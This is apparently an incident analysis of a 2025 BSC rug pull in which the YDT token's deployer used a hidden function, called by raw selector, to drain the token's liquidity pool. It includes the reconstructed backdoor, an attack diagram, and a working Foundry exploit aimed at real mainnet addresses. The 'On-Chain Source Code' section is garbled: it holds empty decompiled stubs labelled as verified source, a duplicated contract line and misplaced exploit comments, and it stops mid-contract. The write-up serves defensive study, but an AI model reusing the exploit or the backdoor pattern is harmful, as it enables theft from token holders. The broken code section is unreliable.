# YDT Token — Token Theft via Special Function Selector Analysis

| Item | Details |
|------|------|
| **Date** | 2025-05-21 |
| **Protocol** | YDT Token |
| **Chain** | BSC |
| **Loss** | Unknown (USDT profit) |
| **Attacker** | YDT contract deployer |
| **Attack Tx** | [bscscan block 50273545](https://bscscan.com/block/50273545) |
| **Vulnerable Contract** | YDT: [0x3612e4Cb34617bCac849Add27366D8D85C102eFd](https://bscscan.com/address/0x3612e4Cb34617bCac849Add27366D8D85C102eFd) |
| **Root Cause** | Hidden function accessible only via a special function selector (0xec22f4c7) that directly moves tokens from the LP pool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/YDTtoken_exp.sol) |

---

## 1. Vulnerability Overview

The YDT token contract contained a hidden function accessible only via a special function selector (`0xec22f4c7`) that was not registered in the standard ABI. This function directly transferred tokens from the LP Pair to a designated address. It could only be executed when the caller matched the `taxmodule` address, and the deployer exploited this to drain YDT tokens from the LP pool. Once YDT was forcibly removed from the LP pool, a `sync()`/`skim()` call updated the reserves, causing the price to collapse.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Hidden function: accessible only via a special selector not in the ABI
// Selector: 0xec22f4c7
// Actual signature: specialTransfer(address from, address to, uint256 amount, address caller)

function specialTransfer(
    address from,    // LP pair address
    address to,      // recipient address
    uint256 amount,  // transfer amount
    address caller   // must be the taxmodule address
) external {
    // ❌ Not registered in ABI — easy to miss in standard audits
    require(caller == taxmodule, "Not authorized");
    // Directly move tokens from the LP pair
    _transfer(from, to, amount);
    // ❌ Causes reserve mismatch without a subsequent pair.sync()
}

// ✅ Correct design: register and document all functions in the ABI
// Functions accessible only via special selectors may go undetected in audits
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: YDTToken_decompiled.sol
contract YDTToken {
contract YDTToken {

    // Selector: 0xa4ef9cf4
    function setAddressB(address a) external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xfd4e4d75
    function addressA() external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x581592f1
    function getUSDT() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xa9059cbb
    function transfer(address a, uint256 b) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x102558a9
    function referralModule() external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xc0d78655
    function setRouter(address a) external view returns (address) {
        // TODO: decompiled logic not implemented
    }


    // This function is part of the exploit path: hidden function that directly moves tokens from the LP pool via special function selector (0xec22f4c7)
    function pancakeRouter() external returns (address) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xbc93233f
    function addToWhitelist(address a, bool b) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x400b6cdc
    function liquidityModule() external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x3af32abf
    function isWhitelisted(address a) external view returns (bool) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xc4e41b22
    function getTotalSupply() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x4526196e
    function addressB() external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x5dab5d5d
    function setAddressC(address a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xf0141d84
    function getDecimals() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xd4dd50cc
    function setAddressD(address a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x70a08231
    function balanceOf(address a) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xa457c2d7
    function decreaseAllowance(address a, uint256 b) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xc54e44eb
    function USDT() external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xdd62ed3e
    function allowance(address a, address b) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xd8574e16
    function addressD() external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x1416d347
    function getAddressA() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }


    // This function is part of the exploit path: hidden function that directly moves tokens from the LP pool via special function selector (0xec22f4c7)
    function pancakePair() external returns (address) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x6c3364ea
    function getAddressB() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x23b872dd
    function transferFrom(address a, address b, uint256 c) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xf2fde38b
    function transferOwnership(address a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x0d1118ce
```

## 3. Attack Flow (ASCII Diagram)

```
Deployer (Insider)
  │
  ├─[1]─► Deploy YDT token (with hidden function)
  │         └─► 0xec22f4c7 selector = specialTransfer backdoor
  │
  ├─[2]─► Regular investors buy YDT (liquidity accumulates in LP pool)
  │
  ├─[3]─► Call specialTransfer(Pair, attacker, balance-1000e6, taxmodule)
  │         └─► Selector: 0xec22f4c7
  │         └─► Move nearly all YDT from LP pool to attacker
  │
  ├─[4]─► Call Pair.sync() (or skim())
  │         └─► Update reserves → YDT price collapses
  │
  ├─[5]─► Swap stolen YDT for USDT on PancakeSwap
  │         └─► swapExactTokensForTokensSupportingFeeOnTransferTokens
  │
  └─[6]─► Collect USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    address YDT = 0x3612e4Cb34617bCac849Add27366D8D85C102eFd;
    address taxmodule = 0x013E29791A23020cF0621AeCe8649c38DaAE96f0;
    address Pair = 0xFd13B6E1d07bAd77Dd248780d0c3d30859585242;
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    function testExploit() public {
        // [3] Drain nearly all YDT from the LP pool
        uint256 amount = IERC20(YDT).balanceOf(address(Pair));

        // Call the hidden function via special selector 0xec22f4c7
        address(YDT).call(
            abi.encodeWithSelector(
                bytes4(0xec22f4c7), // ❌ Hidden function not registered in ABI
                address(Pair),      // from: LP pool
                address(this),      // to: attacker
                amount - 1000*1e6,  // amount: nearly the full balance
                address(taxmodule)  // caller: privileged address
            )
        );

        // [4] Pair sync → price collapse
        address(Pair).call(abi.encodeWithSelector(bytes4(0xfff6cae9))); // sync()

        // [5] Swap YDT for USDT
        address[] memory path = new address[](2);
        path[0] = address(YDT);
        path[1] = address(USDT);
        IERC20(YDT).approve(address(Router), type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(YDT).balanceOf(address(this)) / 10,
            0,
            path,
            address(this),
            block.timestamp + 200
        );

        emit log_named_decimal_uint("Profit in USDT", IERC20(USDT).balanceOf(address(this)), 18);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Hidden Function / Backdoor |
| **Attack Technique** | Unregistered function selector abuse |
| **DASP Category** | Access Control |
| **CWE** | CWE-506: Embedded Malicious Code |
| **Severity** | Critical |
| **Attack Complexity** | Low (deployer insider attack) |

## 6. Remediation Recommendations

1. **Bytecode Decompilation**: Before deployment or investment, decompile the contract bytecode to discover functions not present in the ABI.
2. **Selector Analysis**: Use Dedaub or Etherscan bytecode analysis tools to verify all function selectors.
3. **Event Monitoring**: Monitor LP token movements in real time to detect anomalous transfers.

## 7. Lessons Learned

- **Hidden Selectors**: Functions not registered in the ABI can still be called directly if they exist in the bytecode.
- **Source Verification Alone Is Insufficient**: Even if source code is verified, hidden functions may still exist — all function selectors must be fully analyzed.
- **taxmodule Pattern**: Privileged addresses disguised as "tax modules" are frequently used as rug-pull mechanisms.